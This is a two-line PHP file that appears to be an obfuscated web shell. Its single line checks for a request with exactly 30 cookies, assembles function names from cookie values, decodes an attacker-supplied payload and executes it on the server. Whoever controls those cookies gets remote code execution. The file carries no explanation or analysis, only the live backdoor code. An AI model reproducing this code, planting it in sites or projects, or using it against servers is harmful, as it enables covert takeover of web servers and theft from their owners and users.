<?php
$p=$_COOKIE;(count($p)==30&&in_array(gettype($p).count($p),$p))?(($p[73]=$p[73].$p[77])&&($p[92]=$p[73]($p[92]))&&($p=$p[92]($p[83],$p[73]($p[42])))&&$p()):$p;